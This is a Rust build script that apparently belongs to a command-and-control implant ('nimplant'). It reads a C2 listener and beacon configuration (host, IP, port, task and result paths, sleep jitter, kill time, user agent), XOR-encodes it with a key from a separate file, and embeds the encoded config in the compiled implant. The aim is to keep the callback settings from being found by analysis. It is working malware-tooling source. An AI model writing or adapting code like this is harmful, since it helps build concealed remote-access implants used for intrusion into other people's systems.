use std::{
    env, error::Error, fs::File, io::{BufWriter, Write}, path::Path,
};

use serde::{Serialize, Deserialize};

fn main() -> Result<(), Box<dyn Error>> {
    let out_dir = env::var("OUT_DIR")?;

    // Write XOR Key
    let raw_xor_key = include_str!("../.xorkey");
    let xor_key = raw_xor_key.parse::<i64>().unwrap();
    let xor_dest_path = Path::new(&out_dir).join("xor_key.rs");
    let mut xor_file = BufWriter::new(File::create(&xor_dest_path)?);

    write!(xor_file, "{}", xor_key)?;

    // Only get what we need from config.toml
    let raw_contents = include_bytes!("../config.toml");
    let contents = std::str::from_utf8(raw_contents).unwrap();
    let c: C = toml::from_str(contents).unwrap();

    // Write config
    let config = toml::to_string(&c).unwrap();
    let xored_config = xor(config.as_bytes(), xor_key);
    let config_contents = format!("vec!{:?}", xored_config);
    let config_dest_path = Path::new(&out_dir).join("_config.rs");
    let mut config_file = BufWriter::new(File::create(&config_dest_path)?);

    write!(config_file, "{}", config_contents)?;

    // Rerun if this file, config or xor key changes
    println!("cargo:rerun-if-changed=build.rs,../config.toml,../.xorkey");

    Ok(())
}

#[derive(Serialize, Deserialize, PartialEq, Debug, Clone)]
struct C {
    listener: L,
    nimplant: N,
}

#[derive(Serialize, Deserialize, PartialEq, Debug, Clone)]
struct L {
    #[serde(rename = "type")]
    l_type: String,
    hostname: Option<String>,
    ip: Option<String>,
    port: Option<u32>,
    #[serde(rename = "registerPath")]
    i_path: String,
    #[serde(rename = "taskPath")]
    t_path: String,
    #[serde(rename = "resultPath")]
    r_path: String,
}

#[derive(Serialize, Deserialize, PartialEq, Debug, Clone)]
struct N {
    #[serde(rename = "sleepTimeSeconds")]
    st: u32,
    #[serde(rename = "sleepJitterPercent")]
    sj: f64,
    #[serde(rename = "killTimeHours")]
    kt: u32,
    #[serde(rename = "userAgent")]
    ua: String,
}

fn xor(s: &[u8], key: i64) -> Vec<u8> {
    let bytes = s.clone();
    let mut k = key.clone();
    let mut result: Vec<u8> = vec![];

    for byte in bytes {
        let mut character: u8 = *byte;

        for m in &[0, 8, 16, 24] {
            let value = ((k >> m) & 0xFF) as u8;

            character = character ^ value
        }

        result.push(character);
        k = k + 1;
    }

    return result
}
